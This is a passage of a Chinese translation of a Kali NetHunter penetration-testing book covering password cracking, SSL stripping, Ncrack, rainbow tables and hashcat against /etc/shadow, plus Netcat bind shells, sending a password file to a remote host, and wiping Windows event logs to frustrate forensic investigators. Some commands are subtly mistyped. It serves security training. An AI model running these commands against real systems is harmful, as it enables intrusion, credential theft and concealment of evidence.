# Kali NetHunter 渗透测试实用指南（二）

> 原文：[`annas-archive.org/md5/459BF96CB0C4FE5AC683E666C385CC38`](https://annas-archive.org/md5/459BF96CB0C4FE5AC683E666C385CC38)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：渗透目标

到目前为止，我们通过一些侦探工作收集了信息，扫描了目标以了解活动目标的位置和它们留下的开放端口，然后尝试通过枚举提取更详细的信息。在这个过程中，我们学到了不少，但我们仍然有更多要学习，包括关于过程和 Kali NetHunter 如何帮助我们的更多信息。我们现在正在进入实际将渗透测试中的渗透放入渗透测试的步骤，尝试获取对目标本身的访问权限。到目前为止，一切都让我们能够计划、学习和准备成功尝试进入。

我们的目标是获取主机的访问权限，如果到目前为止我们做得不错，我们积累的信息将会帮助我们。当我们获得对系统的访问权限时，有看似无穷无尽的方法可以实现这一点，但我们将把重点限制在其中一些方法上，并展示 Kali Nethunter 如何在执行这些方法时有所帮助。在这个过程的这一部分，您可以期待执行各种任务，这些任务旨在破解或恢复密码、提升权限、执行应用程序、隐藏文件、覆盖踪迹，以及以其他方式掩盖您的行动证据。这都是每天的工作，所以让我们启动 Kali Nethunter 并开始吧。

在本章中，我们将涵盖以下主题：

+   选择破解方法

+   在目标上执行应用程序

+   捕获机密信息

+   密码破解技术

+   执行应用程序

+   提升权限

+   运行后门

# 技术要求

在本章中，您将需要 Kali NetHunter（默认安装即可）。

# 关于密码

获取系统访问权限的一个常见第一步是使用您在系统上获得的帐户的密码。当然，获取这个密码是重要的，因为您必须找到一种方法来获取有效帐户的密码。这就是所谓的密码破解或密码恢复的过程发挥作用的地方。

那么，术语*密码破解*的定义是什么呢？尽管电影和电视对这个话题有所描述，但密码破解是一个用于获取这一信息的一组技术的总称。在这个过程中，您可以期待使用任何个别或组合的方法，每种方法都有其优缺点。您可以盲目猜测密码，或者您可能对系统所有者有一些信息，这可能会使猜测过程变得更容易。获取密码的其他技术可能涉及反复猜测或利用系统中的安全漏洞。

# 选择破解方法

为了让事情变得更容易，让我们把密码破解分解成几个主要类别，然后将我们的技术分类。我们将根据操作方法将技术分类，作为主要特征。请注意，每个类别和其中的技术不仅提供独特的方法，还有各自的优缺点，我们将在遇到它们时进行讨论。以下图表显示了密码破解攻击的分类：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/cafd3606-58a5-4cab-bbf5-4e6d54640049.png)

密码破解技术的类别如下：

+   **被动技术**：这个类别中的任何攻击都是通过简单地监听和避免与目标直接交互来执行的。离线密码攻击旨在利用密码存储方式中固有的设计缺陷和缺陷。

+   **直接技术**：这种技术需要更积极和直接地与目标进行交互。这些类型的攻击可能非常有效，但被发现的风险更高。

# 被动技术

在这个第一类别中，我们有那些采用低风险方法耐心等待的技术。这个过程和最终结果的有效性取决于所采用的方法、密码的强度和目标系统。

**嗅探**是一种非常有效的获取信息的方法，因为你只需插入到网络中，打开一个嗅探器，它将观察并捕获流经数据包流的信息。这种技术之所以特别有效，是因为如果你针对的是通过不安全方法传输的凭据，比如使用较旧的网络协议（如文件传输协议（FTP）、Telnet 或简单邮件传输协议（SMTP））传输的凭据。许多这些长期存在且常用的协议因缺乏任何可感知的保护而容易受到攻击。例如，HTTP 发送的是明文信息，你可以使用诸如 Wireshark 之类的工具来嗅探数据包并查看数据包内的内容：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/178a9a21-21d2-4dd1-b569-dc0cd3f17d26.jpg)

上图显示了嗅探器可以放置在网络上的位置。

# 中间人攻击

在嗅探的基础上，我们有**中间人攻击**（**MITM**）。当两个设备正在进行通信，第三个设备从监听状态转变为主动参与状态时，就会发生这种攻击。下图显示了中间人攻击的概念：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d5c37dd6-2830-4330-a9eb-d7ac15a17dcc.jpg)

这种类型的攻击对捕获网络流量和协议很有用。然而，一些协议也被发现存在漏洞，比如用于保护许多电子商务和类似应用的安全套接层（SSL）。

在 Kali NetHunter 中，你会找到一些工具能够帮助你执行中间人攻击，比如 SSL 剥离和 Burp Suite。为了演示中间人攻击，让我们使用 SSL 剥离。

SSL 是一个广泛使用的标准，它诞生于 1990 年代初，并且从 1995 年起公开可用。该协议的最新版本是 SSL 3.0，于 2015 年中期被弃用，不应再使用，因为存在成功的妥协，比如公开的 POODLE 攻击。为了确保安全通信，SSL 应该被新的**传输层安全**（**TLS**）1.2 版本所取代，以保持最强大的安全级别。

所以，在我们开始实际攻击之前，让我们先了解一些细节，以便充分欣赏它。

**地址解析协议**（**ARP**）欺骗，将利用 ARP 协议（如果你还记得你的基本网络经验，它将 IP 地址与特定 MAC 地址关联起来）使我们针对的系统相信我们是路由器（而实际上并非如此）。

由于我们使用 ARP 欺骗，我们在网络上使用伪造的 ARP 消息，目的是改变系统上的 ARP 缓存。在正常情况下，当系统发送 ARP 请求时，它正在寻找与给定 IP 地址对应的 MAC 地址。当得到响应时，返回的消息将包括与请求匹配的系统的 IP 地址和 MAC 地址，然后将被缓存在请求者的系统中。当我们毒化这些缓存时，我们发送一条消息，重写缓存为不同的 MAC 地址，这将使流量以与网络所有者意图不同的方式进行路由。这将导致流量以多种不同的方式进行定向。

通过这种简单的行为，客户端将把它们的流量转发到我们的系统，我们可以在将其转发之前执行我们的中间人攻击，而不是将其发送到实际的路由器。

**流量分析**：在幕后，我们使用 SSL 剥离来检测通过我们系统流动的使用 SSL 协议的 URL 的请求。符合我们标准的流量将被拦截和修改。

**拦截和修改请求**：基本上，当涉及到 SSL 剥离检测请求时，它会剥离 SSL，然后修改请求或者简单地收集信息。

因此，如果我们把所有这些放在一起，我们就可以看到在运行**SSL 剥离**时发生了什么：

1.  攻击者通过欺骗路由器的 MAC 地址使自己看起来像路由器。

1.  客户端像往常一样向网站或其他位置发出请求。

1.  应直接发送到路由器的请求，而是发送到攻击者的模拟系统。

1.  SSL 剥离（在攻击者的系统上运行）观察流量，并寻找任何发送到使用 SSL 的位置的请求。

1.  当发出 SSL 请求时，它将被剥离其保护，并检索私人信息。

1.  然后请求重新应用其 SSL 层并转发到服务器。

1.  服务器响应并将 SSL 保护的内容发送回攻击者，攻击者剥离请求的 SSL 并收集返回的信息。

1.  然后将响应返回给客户端，客户端对此一无所知。

因此，让我们使用 SSL strip。

# 练习-使用 SSL strip

为了准备好使用 SSL strip，我们需要提前设置一些东西-幸运的是，我们已经具备了这样的技能。我们将设置以下内容：

+   IP 转发

+   IP 表重定向`80`到`8080`

+   查找网关 IP

+   查找目标 IP

+   Arpspoof

应执行以下步骤来设置 IP 转发：

1.  在终端窗口中输入以下内容：

```
echo '1' > /proc/sys/net/ipv4/IP_forward 
```

1.  设置重定向，将端口`80`的请求重定向到`8080`。在终端窗口中，输入以下命令：

```
 iptables -t nat -A PREROUTING -p tcp -destination-port 80 -j REDIRECT 
-to-port 8080 
```

1.  通过在终端窗口中输入以下内容来查找路由器 IP：

```
netstat -nr 
```

1.  从列表中选择一个目标。为了针对客户端进行定位，我们需要找到一个客户端并获取其 IP。您可以通过使用 nmap、嗅探或其他方式来完成此操作。一旦获得此 IP，就可以进行下一步。

1.  通过在终端窗口中输入以下内容来重定向流量通过托管 SSL Strip 的攻击计算机：

```
arpspoof -i interface -t target IP -r router IP 
```

1.  保持终端窗口打开。

1.  打开第二个终端窗口并保持第一个窗口打开。

1.  在第二个终端窗口中输入`sslstrip -l 8080`启动`sslstrip`；这将告诉`sslstrip`通过`-l`开关监听端口`8080`。如果回顾我们之前的步骤，我们重定向到端口 8080，因此我们正在观察流向该端口的流量。

1.  在目标系统（在*步骤 4*中找到的系统）上打开一个使用 SSL 的网站（您可以通过站点地址中的`https`来判断）。Gmail 等网站是一个例子。

1.  访问该网站并输入您的帐户或其他项目的凭据；您会注意到在 sslstrip 系统上捕获的数据。

1.  在 Kali NetHunter 系统上捕获一些流量，切换到运行 sslstrip 的窗口，并按*Ctrl* + *C*停止进程，并自动将结果写入名为`sslstrip.log`的文件。

结果可以在任何文本编辑器中打开，例如 nano。

# 主动技术

主动密码破解技术直接在目标系统上或对目标系统进行。使用这种类型的技术的缺点是增加被检测到的机会。

# 使用 Ncrack

进行此类攻击的一种方法是使用 Kali NetHunter 附带的 Ncrack 实用程序。该实用程序旨在对网络上的主机进行审计，以查找可能被利用来攻击主机或网络设备的弱密码。该实用程序基于命令行，可以使用不同组合的开关和选项来精细化破解过程。此外，该实用程序支持许多主要协议和服务，包括 RDP、SSH、HTTP(S)、SMB、POP3(S)、VNC、FTP、SIP、Redis、PostgreSQL、MySQL 和 Telnet。

# 练习-使用 Ncrack

为了使用 Ncrack，我们可以利用迄今为止在活动系统、端口扫描和用户名上收集的信息来开始工作：

1.  查找活动系统。

1.  查找 Ncrack 支持的运行服务的端口。

1.  执行对端口的横幅抓取，使用 telnet 或您选择的横幅抓取工具（如 nmap）对服务进行指纹识别。

1.  使用任何用户名，例如您从 SMTP 枚举中收集的用户名，并将它们保存到一个文本文件中。将文件保存为您可以记住的名称，例如`usernames.txt`。

1.  创建第二个文本文件，其中包含您要尝试的密码。您还可以通过查找`密码列表`或`单词列表`来从互联网上下载此文件。将其保存到一个您可以记住的文本文件中，例如`passwords.txt`。

完成后，我们可以使用 Ncrack 来查看我们能够吓唬出什么结果：

```
ncrack -vv -U usernames.txt -P passwords.txt <IP address:port number>, CL=1 
```

在这个例子中，我们使用以下内容：

+   `-vv` 用于在命令运行时增加输出细节。

+   `-U` 用于指定要尝试的用户名文件。

+   `-P` 用于指定要使用的密码文件。

+   IP 地址和 Ncrack 支持的服务的端口。

+   `CL` 用于指定与目标同时打开的连接数。更多的连接可能会增加速度。

如果命令对某个帐户成功，你的结果将被打印在屏幕上，如下所示：

```
smtp://192.168.1.2:110 finished. 
Discovered credentials on rdp://192.168.1.200:110 'schmuck' 'aesop' 
```

正如您所看到的，用户名是`schmuck`，密码是`aesop`。

# 离线攻击

**离线攻击**不是直接针对目标进行的，而是针对攻击者的系统本身。离线密码破解非常消耗 CPU。

# 彩虹表

离线攻击功能和力量的一个非常有效的演示是通过一种称为彩虹表的技术。这种类型的攻击利用了使用给定哈希方法创建的所有不同字符组合的预计算哈希。在实践中，彩虹表将由渗透测试人员创建，他将选择创建哈希的参数。例如，定义密码的最小和最大长度的参数，以及字符集和哈希类型将被定义。结果将是一个可以用来找到正确密码的表。

那么我们如何使用表找到正确的密码呢？简单！我们从受害者的本地存储中检索一个哈希密码，或者通过嗅探从网络中捕获它。

彩虹表的缺点是必须在执行恢复密码的尝试之前生成它们。彩虹表的另一个失败是，尝试恢复的密码越长，生成的表越大，生成它所需的时间就越长。

# 练习 - 创建彩虹表

利用彩虹表破解方法的第一步是实际创建表本身。为此，我们将使用`rtgen`来生成我们指定的参数的表。

# 练习 - 使用 rtgen

要使用`rtgen`命令，我们必须打开一个终端窗口并提供所需的参数。以下是`rtgen`提供的选项列表：

```
lm, plaintext_len limit: 0 - 7 
ntlm, plaintext_len limit: 0 - 15 
md5, plaintext_len limit: 0 - 15 
sha1, plaintext_len limit: 0 - 20 
mysqlsha1, plaintext_len limit: 0 - 20 
halflmchall, plaintext_len limit: 0 - 7 
ntlmchall, plaintext_len limit: 0 - 15 
oracle-SYSTEM, plaintext_len limit: 0 - 10 
md5-half, plaintext_len limit: 0 - 15 
```

如果我们想生成一个彩虹表，我们输入：

```
rtgen sha1 loweralpha-numeric 1 8 0 5000 6553600 0 

usage: rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index 
```

在创建彩虹表时，每个表都是针对给定的哈希类型，例如 MD5 或 SHA1。`rtgen`程序支持许多哈希算法，例如 MD5 和 SHA1。

在前面的例子中，我们生成了 SHA1 彩虹表，这将加快破解 SHA1 哈希的速度。

命令执行后，您将在执行命令的文件夹中留下扩展名为.rt 的文件。下一步是使用以下命令对文件进行排序：

```
Rtsort *.rt 
```

这将在我们使用它们之前对文件进行排序。

现在我们将使用以下命令恢复密码。这是第一个：

```
rcrack *.rt -l filename.txt (this will attempt to recover passwords from hashes stored in a text file)
```

或者，您可以使用此命令：

```
rcrack *.rt -h <hash> 
```

此命令将尝试恢复提供的哈希密码。

# 将它们放在一起

要成功破解密码，您必须有一个计划；仅仅通过不同的技术来尝试可能会取得“成果”，但更有可能不仅不成功，而且可能在过程中被检测到。因此，让我们考虑一种策略，以利用我们在 Kali NetHunter 中强大的工具。

首先，您应该了解，您尝试破解密码的哈希很可能存在于不同的位置，这取决于您的方法和目标环境。

在使用 Microsoft Windows 的环境中，这些位置是 SAM 文件，它存在于本地计算机文件系统中，也存在于 Active Directory 中，如果环境使用域。

那些基于 Linux 或 UNIX 环境的环境通常将它们的哈希存储在完全不同的位置。这些系统将它们的哈希存储在一个名为`/etc/shadow`的位置，这也是在本地文件系统上。

在这两种情况下，哈希是一种单向加密，为每个密码生成唯一的输出或指纹。当然，尽管哈希是不可逆的，我们已经解释过彩虹表可以用来查找生成哈希的内容；然而，还有一个问题没有解决。这个问题是有多种哈希算法，相同的输入会在每种算法上产生不同的结果。因此，我们需要在走得太远之前确定哈希算法；幸运的是，我们有办法做到这一点。

例如，基于 Linux 的系统使用众所周知的 MD5 算法，而 Windows 系统使用 HMAC-MD5，一些其他技术使用 SHA1、MD4、NTLM 等。

一种方法是使用 Kali NetHunter Linux 中的一个工具，称为 hash-identifier。这个工具可以通过在 Kali NetHunter 中打开命令提示符并输入以下命令来运行：

```
hash-identifier <retrieved hash> 
```

hash-identifier 工具将尝试识别哈希并列出可能的类型。

另一个选择是使用 John the Ripper 密码破解工具（也包含在 Kali NetHunter 中）。然而，在其他流行的密码破解工具中，自动检测不是一个选项，因此需要指定哈希类型，因此需要 hash-identifier。

# 练习-使用 hashcat 恢复密码

让我们使用 Kali NetHunter Linux 和 hashcat 来恢复我们的第一组密码。**Hashcat**被认为是最快的基于 CPU 的密码恢复工具之一。虽然最初是专有的，但现在这个软件完全免费，不仅在 Linux 中广泛使用，在 OS X 和 Windows 中也广泛使用。它还配备了一个可以利用系统的 CPU 的版本，但也有能力利用更快的图形处理单元（GPU）。hashcat 支持的哈希算法的例子包括 Microsoft 的 LM 哈希、MD4、MD5、SHA 系列、Unix Crypt 格式、MySQL、Cisco PIX。

要在 Kali NetHunter 中启动密码破解过程，请转到`应用程序` | `Kali NetHunter Linux` | `密码攻击` | `离线攻击` | `hashcat`。

这将打开一个带有一些帮助信息的终端窗口。

在屏幕顶部，您将看到 hashcat 的语法：

```
hashcat options hashfile mask <wordfile> <directory> 
```

其中一些最重要的是-m（哈希类型）和-a（攻击模式）。

让我们分析 hashcat 的语法和重要的选项，这些选项可以用来定制和调整使用 hashcat 进行破解的过程。这些规则可以接受您创建的单词列表文件，并应用大写规则、特殊字符、单词组合以及附加和前置数字。这些技术中的每一种都会增加破解更复杂密码的可能性。事实上，hashcat 将允许您定制用于尝试在目标上恢复密码的自定义字符集和选项。

您还将被要求选择正在破解的哈希类型。如果您知道您正在瞄准的系统上的哈希类型，或者已经使用了哈希标识符，那么可以这样做。

最后，我们必须选择我们要尝试破解的哈希类型。Hashcat 给了我们很多选择。当准备好瞄准哈希时，您将从 hashcat 呈现的列表中选择（按编号）正在瞄准的哈希类型。

您可以从网上下载一个单词列表，或者您可以使用 locate 命令在您的 Kali NetHunter 系统中搜索内置的单词列表。您可以使用以下语法来做到这一点：

```
locate rockyou.txt
```

一旦我们准备好了 hashcat 和一个单词列表，我们可以通过以 root 用户登录并查看`/etc/shadow`来获取一些哈希。在 Linux 中，可以这样做：

```
tail /etc/shadow
```

一旦执行了这个命令，我们就可以看到带有哈希的 shadow 文件。

有了这些信息，现在我们需要确定系统使用的是什么类型的哈希。幸运的是，我们可以通过发出以下命令相当容易地做到这一点：

```
more /etc/login.defs 
```

通过按 Enter 键向下滚动文件约 80%，直到看到一个标记为`ENCRYPT_METHOD`的条目，其后通常是 SHA512 的值。这很重要，因为 hashcat 将需要这些信息来显示哈希。

有了哈希的位置信息以及系统使用的哈希算法的知识，现在可以开始破解哈希的过程了。

首先，我们想把哈希放入一个我们将命名为`hash.lst`的文件中，我们通过发出以下命令来创建这个文件：

```
cp oringal_hashes.txt /etc/shadow hash.lst 
```

为了确保一切都被复制过去，让我们发出以下命令：

```
more hash.lst 
```

如果一切顺利完成，您应该看到哈希已经按预期复制到`hash.lst`文件中。

在我们尝试破解此文件中的哈希之前，我们需要剥离一些信息以清理一下。基本上，我们将删除任何不是哈希的东西。默认情况下，文件将包括用户名信息，在此过程中不需要。

为了确保这个过程将会成功，您需要删除用户名和紧接用户名的冒号。在您删除了这个之后，您将删除一切：去到行的末尾并删除任何以冒号开头的东西。为了进一步解释，让我们考虑以下截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/504103ce-036e-4788-b546-5109b1361578.jpg)

我们需要清理一下，只显示高亮的哈希值：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a0ecead2-3a40-417c-9d9b-17f1600db71d.jpg)

在最后一步，您现在可以开始破解哈希的过程了。以下是启动此过程的命令：

```
Kali Nethunter > hashcat -m 1800 -a 0 -o cracked.txt --remove hash.lst /usr/share/sqlmap/txt/ 
wordlist.txt 
```

+   `-m 1800`指定了我们要破解的哈希类型（SHA-512）。

+   `-a 0`指定了字典攻击。

+   `-o cracked.txt`是破解密码的输出文件。

+   `--remove`告诉 hashcat 在破解后删除哈希。

+   `hash.lst`是我们的哈希输入文件。

+   `/usr/share/sqlmap/txt/wordlist.txt`是我们用于此字典攻击的单词列表的绝对路径。

一旦破解过程开始，您可以通过按下*Enter*键来查看进展情况。这个过程将需要不同的时间，这取决于您的安卓设备的性能以及同时运行在系统上的其他内容。

# 执行应用程序

在本节中，我们将讨论如何远程运行应用程序以及您可以利用这种能力做些什么。

作为渗透测试人员，您应该对此时将要做的事情有一个很好或明确的想法，比如运行一个应用程序或执行。需要执行以下任务：

+   **后门**：在入侵系统后，黑客会在受损的计算机中创建多个入口。这是为了确保攻击者始终有一种方式进入计算机，无论是出于远程访问目的还是为了外泄数据。这就是所谓的后门。后门通常是当特洛伊木马病毒安装在主机计算机上时创建的。

+   **键盘记录器**：这是一种软件或硬件设备，具有从用户键盘记录按键的能力。

# 提升权限

在入侵操作系统（如 Windows）之后，您将在系统上拥有有限的特权。这意味着如果您尝试执行某些命令或运行应用程序，内置安全性将拒绝此类操作。如果您能够破坏用户帐户，它可能也是一个具有有限特权的标准用户。作为渗透测试人员，我们希望能够在受害机器上执行任何命令和应用程序，而不受任何限制。

因此，根据渗透测试的目标，您可能需要在 Windows 环境中获得"管理员"特权，或者在基于 Linux 的系统上获得 root 级别访问权限。

# 在目标上执行应用程序

一旦获得访问权限并获得足够的特权，就该执行受害者上的应用程序了。在这一点上执行哪些类型的应用程序或操作是您需要决定的，但您可以做的事情非常多。

# 练习-使用 Netcat 种植后门

**Netcat**就像 TCP/IP 堆栈中的瑞士军刀。它是一个非常受欢迎的网络工具，为网络和安全专业人员提供了许多功能；其中一些功能包括以下内容：

+   能够在网络上传输数据

+   能够传输文件

+   打开服务端口

+   进行端口扫描和横幅抓取

Netcat 并不特定于操作系统；它适用于 Windows 和 Linux 平台。在本节中，我们将看一些 Netcat 的例子和用法。

要连接到另一台机器，请执行以下操作：

```
nc <host IP address> < port> 
```

要监听入站连接，请发出以下命令：

```
nc -l -p <port> 
```

只需用远程系统上的任何未使用的有效端口替换端口号。

在您希望连接的系统上运行以下命令：

```
nc <remote host IP address> <remote port> 
```

这个命令表示要联系远程系统，然后连接到您告诉`nc`在远程系统上监听的端口。

让我们再深入一点。

现在让我们在目标系统上创建一个后门，我们可以随时使用。根据您是否针对 Linux 或 Windows 系统，命令会略有不同。

对于 Windows，我们使用以下命令：

```
 nc -l -p <port number> -e cmd.exe
```

对于 Linux，我们使用这个：

```
nc -l -p <port number> -e /bin/bash 
```

在这两个命令中，使用-e 开关来在连接到命令 shell 时执行命令。这意味着我们将在本地获得一个 shell，我们可以用它来向远程系统发送命令。然后，在我们的攻击系统上，我们输入以下内容：

```
nc <remote host IP address> <remote port> 
```

在这一点上，如果您成功执行了命令，您将看到一个命令提示符，允许您与远程系统进行交互。

Netcat 也可以用于从目标中转移文件和数据。我们可以使用隐蔽连接将数据慢慢复制到我们的本地系统。在这个例子中，我们将转移一个名为`passwords.xls`的文件，可能是一个包含密码的 Excel 文件。

从源系统，我们输入以下内容：

```
type passwords.xls | nc <remote IP> <remote port>  
```

这个命令表示要显示`passwords.xls`文件，然后将其管道(`|`)到 netcat (nc)到`192.168.1.104`远程 IP 地址通过端口`6996`。

从目标系统，我们输入以下内容：

```
nc -l -p 6996 > passwords.xls 
```

这个命令表示要在端口(`p`)`6996`上创建一个监听器(`l`)，然后将在此监听器上接收到的数据发送到名为`passwords.xls`的文件中。

# 总结

我们开始时看了如何利用在前几步中收集的有关目标的信息。在前几章中收集的信息是通过与目标的直接交互来逐渐增加的。我们的目的是获得更多信息，以便在尝试更少侵入性的情况下利用系统。

通常我们会先破解或恢复密码，以获取账户访问权限，然后尝试通过特权升级来获得对系统的额外访问权限。有了这种增加的访问权限，就有可能执行更具侵入性的任务。攻击者通常可能尝试执行的常见操作包括安装软件、安装远程软件，或者创建其他后门以便以后访问。

在下一章中，我们将学习如何清除痕迹并从目标系统中删除证据。

# 进一步阅读

请参考 Kali Linux/Kali NetHunter 工具列表：[`tools.kali.org`](http://tools.kali.org)。


# 第六章：清除目标上的痕迹和移除证据

渗透测试过程中最重要的一个方面是确保系统上没有任何被入侵的痕迹。就像黑客一样，你的目标可能是入侵目标系统或网络，然而，在终止连接或退出受害者系统时，确保没有任何日志或残留数据留下是非常重要的。此外，在渗透测试期间，可能会生成额外的数据，这些数据会在系统和网络上留下痕迹。

在本章中，我们将涵盖以下主题：

+   清除 Windows 上的日志

+   清除 Linux 上的日志

+   从目标中删除文件

让我们深入研究一下！

# 清除痕迹

网络安全领域正以指数级增长；需要专业人员来帮助打击和保护组织和公民免受网络威胁和威胁行为者的需求非常高。网络攻击可以是任何来自网络钓鱼邮件、恶意软件感染，甚至勒索软件攻击；网络安全组织和认证机构，如 EC-Council 和 GIAC，认识到数字世界中取证对于调查是多么重要，以确定发生了什么事情，攻击是如何发生的，威胁行为者等等细节，这些都可以帮助检察机关在法庭上进行起诉。

在网络安全领域，安全事件是由组织的系统或网络触发的事件，表明存在被入侵的迹象。安全事件的一个例子是员工计算机上运行的恶意文件。反恶意软件保护软件将检测并触发警报以进行调查。

数字取证领域为许多新工作打开了大门，例如第一响应者、事件处理者、网络取证调查员和恶意软件研究员。这些职称都有一个共同的目标：确定系统是如何被威胁行为者入侵的。对于系统上的任何操作，无论是用户还是应用程序，都会生成并存储系统日志消息以供核算目的。在取证调查期间，检查员通常会尝试从系统中检索日志。日志消息将指示安全事件的整个历史。

# 日志类型及其位置

在本节中，我们将讨论渗透测试人员应考虑删除的各种类型的日志以及这些日志的位置。

# DHCP 服务器日志

这些日志保留了网络上 IP 地址分配的记录。此日志存储了潜在的 DHCP 客户端和 DHCP 服务器之间发生的所有交易。最重要的是，客户端的**媒体访问控制**（**MAC**）地址将存储在日志消息中。以下是 DHCP 服务器日志的位置：

+   Windows 系统中的 DHCP 日志存储在`%SystemRoot%\System32\dhcp`目录中。

+   在 Linux 上，要查看 DHCP 日志，我们可以使用`cat /var/log/syslog | grep -Ei 'dhcp'`命令。

# Syslog 消息

当组织内发生网络攻击时，无论是中间人攻击还是系统充当僵尸机器并成为僵尸网络的一部分，都会进行调查。取证调查员不仅对计算机、笔记本电脑和服务器进行调查和分析，还对网络进行调查。对于网络上发生的每个会话或交易，诸如防火墙、入侵检测/防御系统（IDS/IPS）和其他网络安全设备都会为所有流量生成日志。设备使用**Syslog**协议和框架以统一格式生成日志消息，其中包含网络专业人员所需和理解的所有必要细节。

在 Linux 系统上，Syslog 位于`/var/log/syslog`。

# 数据包分析

此外，深入研究网络取证，调查员进行数据包分析，观察网络段上的任何异常情况。数据包分析允许调查员确定以下内容：

+   攻击来源

+   上传和下载的文件

+   网络上的流量类型

+   攻击时间

+   提取的文物，如文件

+   URL 和域名

+   攻击期间的受害机器

+   遥测信息

# Web 服务器日志

这些日志存储了 Web 服务器和客户端 Web 浏览器之间的所有 Web 活动的日志消息。以下是每个 Web 服务器的位置：

+   **Internet Information Server** (**IIS**)日志文件位于`%SystemDrive%\inetpub\logs\LogFiles`。

+   Red Hat、CentOS 和 Fedora 中的 Apache 日志存储在`**/**var/log/httpd/access_log`和`/var/log/httpd/error_log`中。

+   对于 Debian 和 Ubuntu 系统，Apache Web 服务器日志可以在`/var/log/apache2/access_log`和`/var/log/apache2/error_log`中找到。

+   FreeBSD Apache 日志位于`/var/log/httpd-access.log`和`/var/log/httpd-error.log`。

# 数据库日志

在渗透测试期间，您可能会被要求操纵目标数据库，无论是创建、修改、删除还是提取信息。在这样做的过程中，数据库会生成自己的一套日志消息。

Microsoft SQL Server 的数据库日志可以在`\\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\*.MDF`和`\\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\*.LDF`找到。调查人员可以检查数据库的错误日志以查找任何可疑活动，这些可以在`\\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\LOG\ERRORLOG`找到。

# 事件日志

事件日志是对系统上采取的行动的记录，无论是否有用户干预。事件日志记录了用户是否成功访问系统或登录尝试失败的安全日志，应用程序日志记录了操作系统上启动或终止程序的情况。事件日志记录了系统上发生的一切，从开机到关机。

在 Windows 10 操作系统中，事件日志存储在注册表中的以下位置：

`HKLM\System\ControlSet00x\Services\EventLog`

要查看 Windows 10 上可用的事件日志列表，使用`wevtutil el`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a392aab8-7002-4693-915d-e479f46307c8.png)

此外，使用`wevtutil gl <name of log>`命令将呈现所选日志的配置信息：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f3840542-feae-4164-bfc3-b04003c82440.png)

此外，Windows 系统日志存储在本地系统的`C:\Windows\System32\winevt\Logs`中：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/b2c9109c-87e2-4dd1-9214-94fcd19b01f7.png)

简单地修改或删除这些位置存储的日志文件将对取证调查团队构成挑战；难以确定攻击的实际顺序，并降低被抓到的机会。

# 在 Windows 上清除日志

在 Windows 操作系统中，**Event Viewer**是一个应用程序，它在一个仪表板中呈现了所有**Application**、**Security**、**Setup**和**System logs**。要访问**Event Viewer**，点击**Start** | **Windows Administrative Tools** | **Event Viewer**：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/07089bb5-fae6-4a21-945e-5a106e308ed4.png)

在 Windows 上打开**Event Viewer**的另一种方法是，只需在键盘上按 Windows + *R*，打开**Run**提示，然后键入`eventvwr.msc`并单击**OK**。

从**Event Viewer**窗口，可以通过在**Action**窗格上选择**Clear Log**功能来清除日志。要清除特定类别的日志，例如所有位于**Application**组中的日志，只需右键单击组名，然后选择**Clear Log**。

# 使用 PowerShell 在 Windows 上清除日志

PowerShell 是一个非常强大的命令行界面，可以让系统管理员在 Windows、MacOS 和 Linux 操作系统上快速执行和自动化操作和任务。

首先，点击 Windows 图标，即桌面左下角的开始图标，然后键入`powershell`。Windows PowerShell 应用程序将出现，只需点击它以进行操作，如下图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f5588bde-1cf1-441f-b8cc-2f04873ecd34.png)

确保您以**Windows PowerShell**管理员身份运行。以管理员权限运行程序或应用程序将消除标准用户遇到的任何限制。这些限制将包括安全权限。

现在，让我们做一些练习来清除日志：

+   **练习 1：清除所有事件日志**

使用`wevtutil el | Foreach-Object {wevtutil cl “$_”}`命令将清除 Windows 上的事件日志：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/18306cbf-5ffe-4d46-abc3-d25973b95f12.png)

执行命令后，日志现在已被清除，如**事件查看器**中所见：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/7305b559-8d97-4d8e-a5f5-4c3f0dcf4bbf.png)

+   **练习 2：从计算机中清除特定日志**

`Clear-EventLog`命令允许管理员清除/擦除特定事件类别的所有日志消息。使用此命令的语法是`Clear-EventLog <LogName>`：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/b556c25d-84cd-40bd-8798-4de4c6f62712.png)

如果您回忆起，使用`wevtutil el`命令将为您提供系统上日志类别的列表。

使用`Get-Help`参数后跟`Clear-EventLog`cmdlet 将为您提供其他选项：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/bd92de68-dff3-437b-bfb5-755b7c6361f9.png)

我们已经完成了 PowerShell 练习。接下来我们将看看如何使用命令提示符来清除下一节中的日志。

# 使用命令提示符在 Windows 中清除日志

在本节中，我们将看看如何使用命令提示符来清除 Windows 操作系统上的日志：

+   **练习 1：清除单个日志**

以前，我们在 Windows 命令提示符上使用`wevtutil el`命令来查看日志类型/类别的列表。我们可以使用`wevtutil cl`后跟特定日志来擦除/清除日志类别中的条目：

